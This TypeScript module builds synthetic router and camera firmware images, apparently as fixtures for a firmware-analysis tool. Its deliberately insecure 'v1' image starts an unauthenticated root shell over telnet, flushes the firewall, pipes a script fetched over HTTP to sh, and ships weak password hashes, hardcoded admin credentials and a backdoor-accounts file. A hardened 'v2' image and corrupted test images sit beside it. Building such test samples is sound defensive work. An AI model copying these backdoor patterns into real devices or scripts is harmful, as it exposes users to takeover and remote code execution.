// 样本生成 runner:供服务端 /api/samples/import 复用,返回内存缓冲不落盘
import { buildFsImage, type FsEntry } from './analysis/packed-fs.js';
import { buildElf, fakePrivateKeyPem, fakeCertPem } from './analysis/synthetic-elf.js';
import { makeShadowHash } from './analysis/hashes.js';
import { lzmaCompress } from './analysis/compression.js';
import zlib from 'node:zlib';

function uImageHeader(payloadSize: number, comp: number, arch = 5, name = 'Router Linux-2.6.31'): Buffer {
  const h = Buffer.alloc(64);
  h.writeUInt32BE(0x27051956, 0);
  h.writeUInt32BE(0x12345678, 4);
  h.writeUInt32BE(payloadSize, 12);
  h.writeUInt32BE(0x80000000, 16);
  h.writeUInt32BE(0x80002000, 20);
  h[29] = arch;
  h[30] = comp;
  h[31] = 2;
  h.write(name, 32, 'latin1');
  return h;
}

function trxHeader(totalLen: number, offs: number[]): Buffer {
  const h = Buffer.alloc(28);
  h.write('HDR0', 0, 'latin1');
  h.writeUInt32BE(totalLen, 4);
  h.writeUInt16BE(1, 14);
  h.writeUInt32BE(offs[0] ?? 0, 16);
  h.writeUInt32BE(offs[1] ?? 0, 20);
  h.writeUInt32BE(offs[2] ?? 0, 24);
  return h;
}

function padTo(b: Buffer, align: number, fill = 0xff): Buffer {
  const rem = b.length % align;
  return rem === 0 ? b : Buffer.concat([b, Buffer.alloc(align - rem, fill)]);
}

const shadowV1 = [
  `root:${makeShadowHash('sha512crypt', 'admin')}:19000:0:99999:7:::`,
  `admin:${makeShadowHash('md5crypt', '123456')}:19000:0:99999:7:::`,
  `support:${makeShadowHash('sha256crypt', 'password123')}:19000:0:99999:7:::`,
  `guest:${makeShadowHash('sha512crypt', 'a-very-strong-passphrase-9f3k')}:19000:0:99999:7:::`,
  'bin:*:19000:0:99999:7:::',
].join('\n');

const shadowV2 = [
  `root:${makeShadowHash('sha512crypt', 'a-very-strong-passphrase-9f3k')}:19000:0:99999:7:::`,
  `admin:${makeShadowHash('sha512crypt', 'rotated-strong-pw-77q')}:19000:0:99999:7:::`,
  `support:${makeShadowHash('sha512crypt', 'support-strong-2026')}:19000:0:99999:7:::`,
  'guest:*:19000:0:99999:7:::',
  'bin:*:19000:0:99999:7:::',
].join('\n');

const rcSV1 = `#!/bin/sh
mount -t proc proc /proc
telnetd -l /bin/sh &
dropbear -p 22 &
httpd -p 80 -h /www &
upnpd -f /etc/upnp.conf &
snmpd -c public &
iptables -F
chmod -R 777 /tmp
wget http://192.168.1.2/bootstrap.sh | sh &
`;

const rcSV2 = `#!/bin/sh
mount -t proc proc /proc
dropbear -p 22 &
httpd -p 443 -S -h /www &
snmpd -c internal-ro-community &
`;

const httpdV1 = `listen 0.0.0.0:80
admin_user=root
admin_password=admin
auth_key=AKIA-FIRMWARE-FACTORY-KEY
debug=1
`;

const httpdV2 = `listen 127.0.0.1:8443
admin_user=root
debug=0
`;

function busyboxElf(version: string): Buffer {
  return buildElf({ machine: 8, bigEndian: true, imports: ['system', 'popen', 'fork', 'execve', 'socket', 'strcpy'], banner: `BusyBox v${version}` });
}
function dropbearElf(version: string): Buffer {
  return buildElf({ machine: 8, bigEndian: true, imports: ['socket', 'bind', 'listen', 'crypt', 'setuid'], banner: `Dropbear SSH v${version}` });
}
function opensslElf(version: string): Buffer {
  return buildElf({ machine: 8, bigEndian: true, imports: ['SSL_new', 'SSL_connect', 'EVP_DigestInit_ex'], banner: `OpenSSL ${version} 11 Sep 2013` });
}

function entriesV1(): FsEntry[] {
  return [
    { path: '/etc', type: 'dir', mode: 0o755, uid: 0, gid: 0 },
    { path: '/etc/init.d', type: 'dir', mode: 0o755, uid: 0, gid: 0 },
    { path: '/etc/init.d/rcS', type: 'file', mode: 0o755, uid: 0, gid: 0, data: Buffer.from(rcSV1) },
    { path: '/etc/shadow', type: 'file', mode: 0o640, uid: 0, gid: 42, data: Buffer.from(shadowV1) },
    { path: '/etc/passwd', type: 'file', mode: 0o644, uid: 0, gid: 0, data: Buffer.from('root:x:0:0:root:/root:/bin/sh\nadmin:x:1000:1000:admin:/home/admin:/bin/sh\n') },
    { path: '/etc/httpd.conf', type: 'file', mode: 0o644, uid: 0, gid: 0, data: Buffer.from(httpdV1) },
    { path: '/etc/snmpd.conf', type: 'file', mode: 0o644, uid: 0, gid: 0, data: Buffer.from('rocommunity public\nrwcommunity private\n') },
    { path: '/etc/dropbear', type: 'dir', mode: 0o700, uid: 0, gid: 0 },
    { path: '/etc/dropbear/id_rsa', type: 'file', mode: 0o600, uid: 0, gid: 0, data: Buffer.from(fakePrivateKeyPem()) },
    { path: '/etc/certs', type: 'dir', mode: 0o755, uid: 0, gid: 0 },
    { path: '/etc/certs/server.pem', type: 'file', mode: 0o644, uid: 0, gid: 0, data: Buffer.from(fakeCertPem()) },
    { path: '/bin', type: 'dir', mode: 0o755, uid: 0, gid: 0 },
    { path: '/bin/busybox', type: 'file', mode: 0o755, uid: 0, gid: 0, data: busyboxElf('1.27.2') },
    { path: '/usr/sbin', type: 'dir', mode: 0o755, uid: 0, gid: 0 },
    { path: '/usr/sbin/dropbear', type: 'file', mode: 0o755, uid: 0, gid: 0, data: dropbearElf('2014.65') },
    { path: '/usr/lib', type: 'dir', mode: 0o755, uid: 0, gid: 0 },
    { path: '/usr/lib/libssl.so', type: 'file', mode: 0o755, uid: 0, gid: 0, data: opensslElf('1.0.1f') },
    { path: '/www', type: 'dir', mode: 0o755, uid: 0, gid: 0 },
    { path: '/www/index.html', type: 'file', mode: 0o644, uid: 0, gid: 0, data: Buffer.from('<html><body>Router Admin v1</body></html>') },
    { path: '/www/backdoor_accounts.txt', type: 'file', mode: 0o644, uid: 0, gid: 0, data: Buffer.from('root:admin\nadmin:admin123\nsupport:password123\n') },
    { path: '/tmp/log', type: 'symlink', mode: 0o777, uid: 0, gid: 0, linkTarget: '/var/log' },
  ];
}

function entriesV2(): FsEntry[] {
  const list = entriesV1().filter((e) => e.path !== '/www/backdoor_accounts.txt' && e.path !== '/etc/dropbear/id_rsa');
  const replace = new Map<string, FsEntry>([
    ['/etc/init.d/rcS', { path: '/etc/init.d/rcS', type: 'file', mode: 0o755, uid: 0, gid: 0, data: Buffer.from(rcSV2) }],
    ['/etc/shadow', { path: '/etc/shadow', type: 'file', mode: 0o640, uid: 0, gid: 42, data: Buffer.from(shadowV2) }],
    ['/etc/httpd.conf', { path: '/etc/httpd.conf', type: 'file', mode: 0o644, uid: 0, gid: 0, data: Buffer.from(httpdV2) }],
    ['/etc/snmpd.conf', { path: '/etc/snmpd.conf', type: 'file', mode: 0o644, uid: 0, gid: 0, data: Buffer.from('rocommunity internal-ro-community\n') }],
    ['/bin/busybox', { path: '/bin/busybox', type: 'file', mode: 0o755, uid: 0, gid: 0, data: busyboxElf('1.36.1') }],
    ['/usr/sbin/dropbear', { path: '/usr/sbin/dropbear', type: 'file', mode: 0o755, uid: 0, gid: 0, data: dropbearElf('2022.83') }],
    ['/usr/lib/libssl.so', { path: '/usr/lib/libssl.so', type: 'file', mode: 0o755, uid: 0, gid: 0, data: opensslElf('3.0.12') }],
    ['/www/index.html', { path: '/www/index.html', type: 'file', mode: 0o644, uid: 0, gid: 0, data: Buffer.from('<html><body>Router Admin v2</body></html>') }],
  ]);
  const merged = list.map((e) => replace.get(e.path) ?? e);
  merged.push({ path: '/etc/security/policy.conf', type: 'file', mode: 0o644, uid: 0, gid: 0, data: Buffer.from('min_password_len=12\nlockout_threshold=5\n') });
  return merged;
}

async function buildRouter(entries: FsEntry[], tag: string): Promise<Buffer> {
  const fsImg = buildFsImage(entries, 'squashfs-le');
  const kernelRaw = Buffer.concat([Buffer.from(`Linux version 2.6.31 (build@${tag}) #1 MIPS\n`, 'latin1'), Buffer.alloc(512, 0x41)]);
  const kernelGz = zlib.gzipSync(kernelRaw);
  const header = uImageHeader(kernelGz.length, 1);
  return Buffer.concat([padTo(Buffer.concat([header, kernelGz]), 0x100, 0x00), fsImg, Buffer.alloc(64, 0xff)]);
}

export async function main(): Promise<Array<{ name: string; buffer: Buffer }>> {
  const v1 = await buildRouter(entriesV1(), 'v1');
  const v2 = await buildRouter(entriesV2(), 'v2');

  const camEntries: FsEntry[] = [
    { path: '/etc/init.d/rcS', type: 'file', mode: 0o755, uid: 0, gid: 0, data: Buffer.from('#!/bin/sh\ntelnetd &\nhttpd -p 80 &\n') },
    { path: '/etc/shadow', type: 'file', mode: 0o640, uid: 0, gid: 42, data: Buffer.from(`root:${makeShadowHash('sha512crypt', 'camera')}:19000:0:99999:7:::\n`) },
    { path: '/bin/busybox', type: 'file', mode: 0o755, uid: 0, gid: 0, data: buildElf({ machine: 40, imports: ['system', 'socket', 'printf'], banner: 'BusyBox v1.20.2' }) },
  ];
  const fsImg = buildFsImage(camEntries, 'cramfs');
  const kernelLzma = await lzmaCompress(Buffer.from('ARM camera kernel 3.4.0\n' + 'K'.repeat(4096), 'latin1'));
  const part1 = padTo(kernelLzma, 4, 0x00);
  const trx = Buffer.concat([trxHeader(28 + part1.length + fsImg.length, [28, 28 + part1.length, 0]), part1, fsImg]);

  const corrupted = (() => {
    const good = buildFsImage([{ path: '/etc', type: 'dir', mode: 0o755, uid: 0, gid: 0 }], 'squashfs-le');
    const bad = Buffer.from(good);
    bad.writeUInt32LE(0xffffffff, 0x28);
    const tocOff = bad.indexOf('FBFS1');
    if (tocOff >= 5) bad.writeUInt32LE(99999, tocOff + 5);
    return bad;
  })();
  const truncated = v1.subarray(0, Math.floor(v1.length * 0.6));

  return [
    { name: 'router-v1.bin', buffer: v1 },
    { name: 'router-v2.bin', buffer: v2 },
    { name: 'camera-trx.bin', buffer: trx },
    { name: 'corrupted.bin', buffer: corrupted },
    { name: 'truncated.bin', buffer: truncated },
  ];
}
